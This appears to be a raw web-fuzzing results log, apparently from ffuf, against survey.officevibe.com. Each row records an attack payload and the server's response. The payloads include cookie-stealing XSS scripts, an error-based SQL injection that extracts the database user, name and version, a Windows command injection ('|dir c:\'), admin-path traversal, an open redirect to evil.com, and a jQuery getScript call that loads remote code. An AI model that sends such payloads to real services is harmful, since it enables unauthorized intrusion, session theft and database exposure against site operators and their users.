FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
servlet/CookieExample?cookiename=<script>alert(document.cookie)(\,https://survey.officevibe.com/servlet/CookieExample?cookiename=<script>alert(document.cookie)(\,,15840,500,75,12,1,text/html,69.67467ms,
hostapd_ssid=.*/hostapd_ssid=\\\,https://survey.officevibe.com/hostapd_ssid=.*/hostapd_ssid=\\\,https://survey.officevibe.com/hostapd_ssid=.*/hostapd_ssid=,18108,301,1406,270,21,text/html; charset=UTF-8,96.002986ms,
?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://survey.officevibe.com/?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com%2f%3fmobile%3d1%26mp_idx%3d%2522%3b%24.getScript(%2527%2f%2f127.0.0.1%2fz%2527)%3b,20499,302,278,6,4,text/html; charset=utf-8,40.698905ms,
config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E,https://survey.officevibe.com/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E,,42062,500,75,12,1,text/html,68.669129ms,
cgi-bin/post32.exe|dir%20c:\,https://survey.officevibe.com/cgi-bin/post32.exe|dir%20c:\,https://survey.officevibe.com/cgi-bin/post32.exe|dir c:,44391,301,1402,271,21,text/html; charset=UTF-8,59.482791ms,
.,https://survey.officevibe.com/.,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,59964,302,195,6,4,text/html; charset=utf-8,40.058718ms,
?mod=<script>alert(document.cookie)</script>&op=browse,https://survey.officevibe.com/?mod=<script>alert(document.cookie)</script>&op=browse,,87084,500,75,12,1,text/html,67.95112ms,
//evil.com/%2F..,https://survey.officevibe.com///evil.com/%2F..,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,106852,302,195,6,4,text/html; charset=utf-8,51.786729ms,
#/../admin,https://survey.officevibe.com/#/../admin,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,113455,302,195,6,4,text/html; charset=utf-8,35.370364ms,
guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E,https://survey.officevibe.com/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E,,128944,500,75,12,1,text/html,48.929691ms,
log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E,https://survey.officevibe.com/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E,,150066,500,75,12,1,text/html,72.246272ms,
#/../console,https://survey.officevibe.com/#/../console,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,162227,302,195,6,4,text/html; charset=utf-8,37.486316ms,
_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&tid=X,https://survey.officevibe.com/_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&tid=X,,166344,500,75,12,1,text/html,60.691326ms,
#/../manager/text,https://survey.officevibe.com/#/../manager/text,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com,168130,302,195,6,4,text/html; charset=utf-8,43.772863ms,
?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,https://survey.officevibe.com/?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,https://app.officevibe.com/login?returnUrl=https%3a%2f%2fsurvey.officevibe.com%2f%3fobjGroupID%3d12%27%257C%257C(SeleCT%2520%27Efe%27%2520FroM%2520duAL%2520WheRE%2520110%3d110%2520AnD%2520(seLEcT%2520112%2520frOM(SElecT%2520CouNT(*)%252cConCAT(CONcat(0x203a20%252cUseR()%252cDAtaBASe()%252cVErsION())%252c(SeLEct%2520(ELT(112%3d112%252c1)))%252cFLooR(RAnd(0)*2))x%2520FROM%2520INFOrmatION_SchEMA.PluGINS%2520grOUp%2520BY%2520x)a))%257C%257C%27,177755,302,560,6,4,text/html; charset=utf-8,77.317153ms,
